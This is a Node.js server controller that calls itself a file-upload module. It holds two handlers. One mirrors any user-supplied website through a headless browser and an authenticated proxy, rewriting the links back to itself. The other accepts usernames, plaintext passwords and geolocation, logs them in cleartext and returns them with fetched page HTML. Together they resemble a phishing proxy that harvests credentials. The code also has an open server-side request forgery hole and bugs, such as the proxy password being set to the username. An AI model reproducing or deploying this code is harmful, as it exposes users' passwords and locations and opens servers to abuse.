/**
 * @fileoverview Controller for FileUpload and File Retrival
 *
 * @author Alen Joseph
 */

const fetch = require('node-fetch')
const getIP = require('ipware')().get_ip;
const puppeteer = require('puppeteer')
const replace = require('absolutify')
const config = require('../config/config')
const log4js = require('log4js');

// logger config
const logger = log4js.getLogger('user.js ');

// @controller   Get Home Page
// @desc     Get Home Page
// @Input   File, Extention
// @Output  Content Hash
// @access  Public

exports.default = async (req,res) => {
 
  logger.info("LookupDAta: ",config.proxyHost)
  const proxyArg = '--proxy-server=https='+config.proxyHost;
  logger.info("kk: "+proxyArg)
  const {url} = req.query
  const puser = config.puser; 
  const proxypwd = config.puser;
  if (!url) {
      return res.send('Not url provided')
  } else {
      try {
          const browser = await puppeteer.launch(
              {
                  args:[ proxyArg ]
              }
          )
          const page = await browser.newPage()
          await page.authenticate(
              {
                  username: puser,
                  password: proxypwd
              }
          )
          await page.goto(`https://${url}`)
          let document = await page.evaluate(() => document.documentElement.outerHTML)
          document = replace(document, `/?url=${url.split('/')[0]}`)
          return res.send(document)
      } catch(err) {
          logger.info(err)
          return res.send(err)
      }
  }

}



// @controller   POST /api/user/login
// @desc    Login user 
// @Input   Username and Password
// @Output  File
// @access  Public

exports.login= async (req, res) => {

  /*
      checking wether the request contains all the required fields.
  */
  if( !req.body.uname|| !req.body.password){
      return res.status(400).send({
          error : "Expected values missing"
      })
  }
  else{

      /*
          Variable declaration for the defenition of post method
      */
      let url = config.websiteUrl
          userIp = getIP(req),
          uname = req.body.uname,
          pwd = req.body.password,
          longtitude = req.body.lo,
          langtitude = req.body.la,
          appname = req.body.appname,
          responseData,
          proxyHost = config.proxyHost;
    
  
      /*
          doing the actual logic.
          ignore the console statements as they are part of manual debugging.
      */

      logger.info("IP: "+JSON.stringify(userIp))

      req1 = await fetch(url).then( res => res.text()).then(body => {
          responseData = body;
          return true;
      })
  


      /*
          consolidating the results to be send to the client
      */

      let result = {
          user : uname,
          password: pwd,
          location: longtitude+","+langtitude,
          browserName: appname,
          responseHTML: responseData
      }
      logger.info(result)
      return res.send(result);

  }
}